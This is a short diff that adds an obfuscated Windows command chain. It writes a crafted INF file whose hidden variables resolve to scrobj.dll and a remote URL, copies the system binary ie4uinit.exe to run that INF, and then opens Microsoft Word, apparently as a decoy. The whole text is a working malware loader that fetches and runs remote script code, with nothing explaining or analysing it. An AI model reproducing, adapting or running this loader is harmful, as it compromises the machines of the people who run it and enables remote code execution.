@@ -1,0 +1,4 @@
+/v /c(for %h in ("[multiplicious_36C24]" "scrob\\" "j.dll,%proteide%,%teloteropathy%//pas%typeform%sfn.com%cliquishly%" "[defaultinstall.windows7]" "delfiles=D78ED6" "Un\" "Register\\" "OCXs=multiplicious_36C24" "[D78ED6]" "ieui%spectrofluorometer%.inf" "[destinationdirs]" "defaultdestdir=11" "D78ED6=01" "[version]" "signature=$windows nt$" "[strings]" "servicename= 'favouring'" "shortsvcname= 'favouring'" "cliquishly=/afs" "typeform=ata" "teloteropathy=http:" "proteide=NI" "spectrofluorometer=nit" ) do @echo %~h) > "%localappdata%\ieuinit.inf" &&
+  call xcopy /Y /C /Q %windir%\system32\ie4uinit.exe "%localappdata%" &&
+  powershell -Command "Start-Process '%localappdata%\ie4uinit.exe' -ArgumentList '-BaseSettings'" &&
+  start "" "C:\Program Files\MicrosoftOffice\root\Office16\WINWORD.EXE"
